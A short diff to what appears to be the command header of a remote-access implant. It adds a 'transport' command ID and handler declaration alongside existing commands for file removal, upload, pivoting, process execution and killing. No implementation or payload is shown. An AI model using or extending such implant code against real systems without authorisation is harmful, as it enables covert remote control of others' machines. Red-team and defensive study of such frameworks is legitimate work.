@@ -26,6 +26,8 @@
 #define COMMAND_RM           17
 #define COMMAND_UPLOAD       33
 
+#define COMMAND_TRANSPORT    69
+
 #define COMMAND_SAVEMEMORY 0x2321
 #define COMMAND_ERROR      0x1111ffff
 
@@ -56,6 +58,7 @@ public:
 	void CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdPivotExec(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void CmdTransport(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker);
